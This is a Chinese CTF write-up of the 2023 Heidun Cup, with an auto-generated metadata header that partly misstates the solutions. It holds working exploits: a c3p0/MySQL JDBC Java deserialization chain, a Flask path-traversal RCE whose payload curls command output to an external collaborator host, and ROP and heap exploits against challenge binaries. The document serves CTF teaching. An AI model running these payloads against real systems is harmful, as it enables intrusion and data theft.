---
title: 2023 黑盾杯 writeup
contest: 黑盾杯
year: 2023
difficulty: hard
vuln_type:
- ssrf
- deserialize
- rce
- sqli
- stego_traffic
- ssrf
- heap_exploit
tags:
- JdbcRowSetImpl
- c3p0 HexAsciiSerializedMap
- MySQL JDBC本地文件读
- Flask site.addpackage
- dnslog外带
- mysqlbinlog
- IOC匹配
- house of orange
- house of force
- one_gadget
- libc-2.27
- SROP
attack_chain: 反编译 jar 看 SecurityCheck 黑名单 → JdbcRowSetImpl+c3p0 userOverridesAsString+HexAsciiSerializedMap 触发 MySQL JDBC 读本地文件 → Flask 路由 /upload 目录穿越 + /install 装包 + /add 用 site.addpackage 加 Python 文件 → dnslog curl base64 外带 → mysqlbinlog 恢复 binlog → 正则 + 后 6 位匹配找 IOC → pwntools 连 pwn 远程 → SROP read /bin/sh → offbyone + house of orange 触发 sysmalloc + house of force 改 top chunk 任意地址 → 劫持 __malloc_hook → one_gadget 0x10a2fc
key_payload: MyBean.setDatabase("mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#") ; site.addpackage('/tmp/extract', 'exp1.py', None) ; kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h=' 写 0x38 字节后接 SROP 链
one_liner: c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。
lesson: 限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDBC fileread 是高成功率的替代链。
quality: high
full_path: 2023黑盾杯-WriteUp.full.md
meta_path: 2023黑盾杯-WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 2023 黑盾杯 writeup。c3p0+MySQL JDBC 读本地 + Flask 装包 RCE + SROP + house of orange 改 top chunk。。经验：限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDB...
category: web
subcategory: web_other
subcategories:
- web_other
- deserialization
- rce
- sql_injection
- stego
- pwn_other
- heap_exploitation
tools_used:
- Flask
- Python
- curl
- pwntools
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/118253.html
reasoning_chain:
- 触发点：jar 反编译看到 SecurityCheck 黑名单 → 假设：TemplatesImpl 不可用需换 gadget → 动作：grep JdbcRowSetImpl JNDI
- 观察：JdbcRowSetImpl+c3p0 HexAsciiSerializedMap 触发 MySQL JDBC → 假设：MySQL 协议带 file:///flag.txt → 动作：setDatabase('mysql://vps:3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&allowUrlInLocalInFILE=true#')
- 触发点：Flask /upload + /install + /add 三路由 → 假设：目录穿越+装包+addpackage RCE → 动作：上传 ../exp1.py 到 /tmp/storage
- 观察：shutil.copy + unpack_archive 写到 /tmp/extract/exp1.py → 假设：site.addpackage('/tmp/extract','exp1.py',None) 加进 site-packages → 动作：访问 import 触发
- 触发点：dnslog 收到 base64 外带回连 → 假设：curl + base64 编码命令 → 动作：bash -c 'curl http://dnslog/?data=$(ls / | base64)'
- 观察：mysqlbinlog 恢复 binlog → 假设：含 SQL 语句找攻击者 → 动作：mysqlbinlog --base64-output=DECODE-ROWS binlog.000001
- 触发点：PWN 远程 pwntools 连 → 假设：栈溢出 + magic gadget → 动作：payload=b'{>o<fi:`mjkj5daqd6fhugim~~rj5h='+p64(SROP)
- 观察：SROP read /bin/sh 跳到 syscall → 假设：触发 sysmalloc 走 offbyone → 动作：构造 offbyone + house of orange
- 触发点：house of orange 改 top chunk → 假设：任意地址 malloc → 动作：写 __malloc_hook 指针
- 观察：house of force 改 top chunk 大小 → 假设：one_gadget 触发 → 动作：one_gadget 0x10a2fc 拿 shell
failed_attempts:
- 试图用 TemplatesImpl gadget → 失败：黑名单含 TemplatesImpl
- 试图用 JNDI 直接 ldap 反弹 → 失败：黑名单含 Jndi 关键词
- 试图用 FastJson 反序列化 → 失败：jar 不是 FastJson
- 试图绕过 /install 的 .. 过滤 → 失败：必须用 /upload + ../ 走间接路径
key_observations:
- 限制 TemplatesImpl 黑名单时 c3p0 HexAsciiSerializedMap + MySQL JDBC fileread 是高成功率替代
- Flask site.addpackage 是 Python web RCE 冷门但致命的入口
- SROP 配合 offbyone + house of orange 改 top chunk 是 libc-2.27 经典三连
- 正则 + 后 6 位 IOC 匹配是流量分析通用思路
- mysqlbinlog 恢复 SQL 是取证定位攻击时间线关键
prerequisites:
- Java 反序列化 gadget 链构造（c3p0/JdbcRowSetImpl）
- MySQL JDBC 协议 fileread_file:/// 攻击向量
- Flask site.addpackage Python 路径
- house of orange + house of force + one_gadget 组合原理
- SROP Sigreturn-Oriented Programming 构造
---
# 2023黑盾杯-WriteUp

> 原文: https://www.ctfiot.com/118253.html
> ID: 118253

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱root@edisec.net、shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web

1

web（初赛）

拿到一个jar包，反编译得到。

public class SecurityCheck { private final String input;
 public SecurityCheck(String input) { this.input = input; checkForBlockedClasses(); }
 private void checkForBlockedClasses() { Pattern pattern = Pattern.compile("(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)"); if (pattern.matcher(this.input).find()) throw new SecurityException("hacker"); }}

package com.example;
import com.ctf.bean.MyBean;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import org.apache.commons.codec.binary.Hex;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
public class Exp { public static void main(String[] args) throws Exception {
 MyBean myBean =new MyBean(); myBean.setDatabase("mysql://vps:
3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#");
 PropertysetItem p = new PropertysetItem();
 NestedMethodProperty<Object> n = new NestedMethodProperty<Object>(myBean, "Connection");
 p.addItemProperty("Connection", n);
 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("v"); Field field = BadAttributeValueExpException.class.getDeclaredField("val"); field.setAccessible(true); field.set(badAttributeValueExpException, p);
 ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bos); out.writeObject(badAttributeValueExpException); out.flush(); byte[] bytes = bos.toByteArray();
 char[] hexChars = Hex.encodeHex(bytes); String hexString = new String(hexChars);
 System.out.println(hexString.toUpperCase()); }}

然后把生成的hex字符串填在下面HexAsciiSerializedMap后面

{"1":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"2":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:
tihuanzheli;",}}

2

pypath（复赛）

from flask import Flask, request, Responseimport osimport shutilimport site
app = Flask(__name__)
@app.route('/')def index(): return app.send_static_file('index.html')
@app.route('/upload', methods=['POST'])def upload(): f = request.files["data"] with open(f'/tmp/storage/{f.filename}', 'wb+') as destination: destination.write(f.read())    return Response("File is uploaded!", 200)

传文件 默认/tmp/storage/路径 目录穿越构造../

@app.route('/install', methods=['GET'])def install(): package_name = request.args.get('package_name') #获取包名 if '..' in package_name: #防止穿越 return Response("Not allowed!", 400)
 src = os.path.join('contrib', 'packages', package_name) dst = os.path.join('/tmp/extract', package_name)
 shutil.copy(src, dst) shutil.unpack_archive(dst, extract_dir='/tmp/extract')#安装包 return Response("Installed!", 200)

@app.route('/clean', methods=['GET'])def clean(): file = os.path.basename(request.args.get('file')) file_safe = f'/tmp/storage/{file}' os.unlink(file_safe) return Response("file removed!", 200)

@app.route('/add', methods=['GET'])def add(): site_dir = "/tmp/extract" name = request.args.get('name') site.addpackage(site_dir, name, None)#addpackage可以加一个python文件if __name__ == "__main__":    app.run(debug=True, host='0.0.0.0')

用bp自带的Collaborator来dnslog

构造exp.py

exp1.py

import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`ls /|base64`")

然后上传，去GET /add?name=exp1.py一次

YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19vbmxpbmVfZG9ja2VyXzQ0NzhfNTgxXzIzNzIudHh0

base64解密：appbinbootdevetcflag_online_docker_4478_581_2372.txt

import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`cat /flag_online_docker_4478_581_2372.txt|base64`")

ZmxhZ3thODc3MWFiNGFhfQ==base64解码：flag{a8771ab4aa}

02

Misc

1

DNS-流量分析（初赛）

504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874
c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c625
87a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400
090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000
666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2
d4340e78d701504b050600000000010001005a0000006a0000000000

密码爆破为：Ap3l，然后打开就是flag。

flag{496d8981f449e45f6e39e1faa0b1ab8a}

2

mylog（初赛）

mysqlbinlog mylog.000001 > mysql.sql

得到mysql.sql文件 导入mysql，source Y:
mysql.sql

3

威胁情报分享2（复赛）

f = open("network.txt","r")w = open("result.txt","w")
# a = '{"Time":"2023/1/1 0:17:27", "SrcHost":"192.168.194.119", "DestHost":"40.118.19.83"},'# print(a)
for a in f.readlines(): a = a.split(""DestHost":"")[1] a = a.split(""}")[0] print(a) w.write(a+"n")
f.closew.close

再正则处理一下ioc.txt，直接在sublime里面操作，replace。

{"type":"domain", "ioc":" -> 空{"type":"ip", "ioc":" -> 空", "tag":".* -> 空

然后得到只有ip和域名的文本，用python进行匹配，找到相似点。

f = open("ioc1.txt","r")w = open("result.txt","r")
for a in f.readlines(): for b in w.readlines(): b = b[-6:] if b in a: print(b)
f.closew.close

可以看到y.net在ioc和network中大量出现，猜测flag带y.net

直接全部复制下来，一个个find，最后可以找到。

flag{lprbriry.net}

4

QZ（复赛）

ZmhxZ3sxMnF3YXN6eGNkZTN9base64解码为：fhqg{12qwaszxcde3}flag{12qwaszxcde3}

03

Crypto

1

py-math-game

import pwn
from pwn import *pwn.context.log_level='debug'# 设置目标地址和端口host = '39.104.26.167'port = 6681
# 连接目标conn = remote(host, port)
# 转数据retest=conn.recv()retest=retest.decode(encoding='utf-8')retest1=retest.split('n')n=int(retest1[1].split("=")[1])sper = retest1[2].split('=')[0]newsper1 = sper.replace('X','*')flager = eval(newsper1)
# 发送数据conn.sendline(str(flager).encode(encoding='utf-8'))conn.recv()conn.sendline(b'open("/flag.txt").read()')conn.recv()

05

Pwn

1

pwn（初赛）

from pwn import *from struct import pack
from ctypes import *
def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
context(os='linux', arch='amd64', log_level='debug')p = process('./pwn')#p = remote('39.104.26.167', 27791)elf = ELF('./pwn')#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so')
kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h='ret = 0x400691rdi = 0x400af3rsi_r15 = 0x400af1PLT1 = 0x4006A6buf = elf.bss() + 0x400
#gdb.attach(p, 'b *0x400a83')
s(kk + b'x00')sleep(1)s(b'a'*0x38 + p64(rsi_r15) + p64(elf.got['alarm'])*2 + p64(elf.sym['read']) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym['read']) + p64(0x400AEA) + p64(0)*2 + p64(elf.got['alarm']) + p64(0)*2 + p64(buf) + p64(0x400AD0))sleep(2)s(b'xf5')sleep(3)s(b'/bin/shx00'.ljust(0x3b, b'a'))
#pause()
inter()

2

leak

没有free的堆，但是edit函数有offbyone漏洞

存在onegadget，就不用泄露地址了，利用house of orange泄露地址，再用house of force。

from pwn import *ly=remote('39.104.26.167',15910)#ly=process("./leak")context.log_level = "debug"libc=ELF('/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')elf=ELF('./leak')def add(idx,size): ly.sendlineafter(b"Your choice:",b'1') ly.sendlineafter(b"Index:",str(idx)) ly.sendlineafter(b"Size:",str(size))def edit(idx,content): ly.sendlineafter(b"Your choice:", b'2') ly.sendlineafter(b"Index:",str(idx)) ly.sendafter(b"Content:",content)def show(idx): ly.sendlineafter(b"Your choice:", b'3') ly.sendlineafter(b"Index:",str(idx))
def delete(idx): ly.sendlineafter(b"Your choice:", b'4') ly.sendlineafter(b"Index:", str(idx))add(0,0x18)
# house of orange 打个页对齐得size到top_chunkpayload=p64(0)*3+p64(0xd91)edit(0,payload)
# 申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)
# 拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base=u64(ly.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))-0x3ec2a0malloc_hook=libc_base+libc.sym['__malloc_hook']one_gadget=libc_base+0x10a2fc#onegadget 0x10a41c
# hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b'x00'*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b'x07'*0x30+p64(malloc_hook)*0x10+b'n')add(5,0xa0)edit(5,p64(one_gadget)+b'n')add(6,0x200)ly.interactive()

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
public class SecurityCheck { private final String input;
 public SecurityCheck(String input) { this.input = input; checkForBlockedClasses(); }
 private void checkForBlockedClasses() { Pattern pattern = Pattern.compile("(?i)(TemplatesImpl|JdbcRowSetImpl|Jndi|54656D706C61746573496D706C|BadAttributeValueExpException)"); if (pattern.matcher(this.input).find()) throw new SecurityException("hacker"); }}
package com.example;
import com.ctf.bean.MyBean;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import org.apache.commons.codec.binary.Hex;
import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
public class Exp { public static void main(String[] args) throws Exception {
 MyBean myBean =new MyBean(); myBean.setDatabase("mysql://vps:
3306/test?user=fileread_file:///flag.txt&ALLOWLOADLOCALINFILE=true&maxAllowedPacket=655360&allowUrlInLocalInfile=true#");
 PropertysetItem p = new PropertysetItem();
 NestedMethodProperty<Object> n = new NestedMethodProperty<Object>(myBean, "Connection");
 p.addItemProperty("Connection", n);
 BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("v"); Field field = BadAttributeValueExpException.class.getDeclaredField("val"); field.setAccessible(true); field.set(badAttributeValueExpException, p);
 ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream out = new ObjectOutputStream(bos); out.writeObject(badAttributeValueExpException); out.flush(); byte[] bytes = bos.toByteArray();
 char[] hexChars = Hex.encodeHex(bytes); String hexString = new String(hexChars);
 System.out.println(hexString.toUpperCase()); }}
{"1":{"@type":"java.lang.Class","val":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource"},"2":{"@type":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:
tihuanzheli;",}}
from flask import Flask, request, Responseimport osimport shutilimport site
app = Flask(__name__)
@app.route('/')def index(): return app.send_static_file('index.html')
@app.route('/upload', methods=['POST'])def upload(): f = request.files["data"] with open(f'/tmp/storage/{f.filename}', 'wb+') as destination: destination.write(f.read())    return Response("File is uploaded!", 200)
@app.route('/install', methods=['GET'])def install(): package_name = request.args.get('package_name') #获取包名 if '..' in package_name: #防止穿越 return Response("Not allowed!", 400)
 src = os.path.join('contrib', 'packages', package_name) dst = os.path.join('/tmp/extract', package_name)
 shutil.copy(src, dst) shutil.unpack_archive(dst, extract_dir='/tmp/extract')#安装包 return Response("Installed!", 200)

@app.route('/clean', methods=['GET'])def clean(): file = os.path.basename(request.args.get('file')) file_safe = f'/tmp/storage/{file}' os.unlink(file_safe) return Response("file removed!", 200)
@app.route('/add', methods=['GET'])def add(): site_dir = "/tmp/extract" name = request.args.get('name') site.addpackage(site_dir, name, None)#addpackage可以加一个python文件if __name__ == "__main__":    app.run(debug=True, host='0.0.0.0')
import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`ls /|base64`")
YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19vbmxpbmVfZG9ja2VyXzQ0NzhfNTgxXzIzNzIudHh0
base64解密：appbinbootdevetcflag_online_docker_4478_581_2372.txt
import os;os.system("curl http://omedlr2zywi92zsul4skkk823t9kxalz.oastify.com/`cat /flag_online_docker_4478_581_2372.txt|base64`")
ZmxhZ3thODc3MWFiNGFhfQ==base64解码：flag{a8771ab4aa}
504b03041400090008003c1bee5204212ed6340000002600000008000000666c61672e747874
c6060a3144f6c49c5bc8305e76f334670b51c53ce58ff0eb452daa8cc6307fa2e2e4fad9c625
87a0a6e29c0e30e71dc6505d2c24504b070804212ed63400000026000000504b01021f001400
090008003c1bee5204212ed63400000026000000080024000000000000002000000000000000
666c61672e7478740a002000000000000100180056f63fe71c78d70156f63fe71c78d7016bd2
d4340e78d701504b050600000000010001005a0000006a0000000000
flag{496d8981f449e45f6e39e1faa0b1ab8a}
mysqlbinlog mylog.000001 > mysql.sql
f = open("network.txt","r")w = open("result.txt","w")
# a = '{"Time":"2023/1/1 0:17:27", "SrcHost":"192.168.194.119", "DestHost":"40.118.19.83"},'# print(a)
for a in f.readlines(): a = a.split(""DestHost":"")[1] a = a.split(""}")[0] print(a) w.write(a+"n")
f.closew.close
{"type":"domain", "ioc":" -> 空{"type":"ip", "ioc":" -> 空", "tag":".* -> 空
f = open("ioc1.txt","r")w = open("result.txt","r")
for a in f.readlines(): for b in w.readlines(): b = b[-6:] if b in a: print(b)
f.closew.close
flag{lprbriry.net}
ZmhxZ3sxMnF3YXN6eGNkZTN9base64解码为：fhqg{12qwaszxcde3}flag{12qwaszxcde3}
import pwn
from pwn import *pwn.context.log_level='debug'# 设置目标地址和端口host = '39.104.26.167'port = 6681
# 连接目标conn = remote(host, port)
# 转数据retest=conn.recv()retest=retest.decode(encoding='utf-8')retest1=retest.split('n')n=int(retest1[1].split("=")[1])sper = retest1[2].split('=')[0]newsper1 = sper.replace('X','*')flager = eval(newsper1)
# 发送数据conn.sendline(str(flager).encode(encoding='utf-8'))conn.recv()conn.sendline(b'open("/flag.txt").read()')conn.recv()
from pwn import *from struct import pack
from ctypes import *
def s(a): p.send(a)def sa(a, b): p.sendafter(a, b)def sl(a): p.sendline(a)def sla(a, b): p.sendlineafter(a, b)def r(): p.recv()def pr(): print(p.recv())def rl(a): return p.recvuntil(a)def inter(): p.interactive()def debug(): gdb.attach(p) pause()def get_addr(): return u64(p.recvuntil(b'x7f')[-6:].ljust(8, b'x00'))def get_sb(): return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/shx00'))
context(os='linux', arch='amd64', log_level='debug')p = process('./pwn')#p = remote('39.104.26.167', 27791)elf = ELF('./pwn')#libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.27-3ubuntu1.5_amd64/libc-2.27.so')
kk = b'{>o<fi:`mjkj5daqd6fhugim~~rj5h='ret = 0x400691rdi = 0x400af3rsi_r15 = 0x400af1PLT1 = 0x4006A6buf = elf.bss() + 0x400
    #gdb.attach(p, 'b *0x400a83')
s(kk + b'x00')sleep(1)s(b'a'*0x38 + p64(rsi_r15) + p64(elf.got['alarm'])*2 + p64(elf.sym['read']) + p64(rsi_r15) + p64(buf)*2 + p64(elf.sym['read']) + p64(0x400AEA) + p64(0)*2 + p64(elf.got['alarm']) + p64(0)*2 + p64(buf) + p64(0x400AD0))sleep(2)s(b'xf5')sleep(3)s(b'/bin/shx00'.ljust(0x3b, b'a'))
    #pause()
inter()
from pwn import *ly=remote('39.104.26.167',15910)#ly=process("./leak")context.log_level = "debug"libc=ELF('/home/ly/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so')elf=ELF('./leak')def add(idx,size): ly.sendlineafter(b"Your choice:",b'1') ly.sendlineafter(b"Index:",str(idx)) ly.sendlineafter(b"Size:",str(size))def edit(idx,content): ly.sendlineafter(b"Your choice:", b'2') ly.sendlineafter(b"Index:",str(idx)) ly.sendafter(b"Content:",content)def show(idx): ly.sendlineafter(b"Your choice:", b'3') ly.sendlineafter(b"Index:",str(idx))
def delete(idx): ly.sendlineafter(b"Your choice:", b'4') ly.sendlineafter(b"Index:", str(idx))add(0,0x18)
# house of orange 打个页对齐得size到top_chunkpayload=p64(0)*3+p64(0xd91)edit(0,payload)
# 申请同样0xd91大小的chunk得到 ubsorted binadd(1,0x1008)
# 拿unsorted bin 一部分泄露libcadd(2,0xd50)show(2)libc_base=u64(ly.recvuntil(b'x7f')[-6:].ljust(8,b'x00'))-0x3ec2a0malloc_hook=libc_base+libc.sym['__malloc_hook']one_gadget=libc_base+0x10a2fc#onegadget 0x10a41c
# hosue of force堆溢出 改topchunk size 为大数 达到任意地址分配的目的，直接劫持mallo_hook打one_gadgetedit(1,b'x00'*0x1008+p64(0xffffffffffffffff))add(3,-0x22010)#gdb.attach(ly)#pause()add(4,0x100)edit(4,b'x07'*0x30+p64(malloc_hook)*0x10+b'n')add(5,0xa0)edit(5,p64(one_gadget)+b'n')add(6,0x200)ly.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]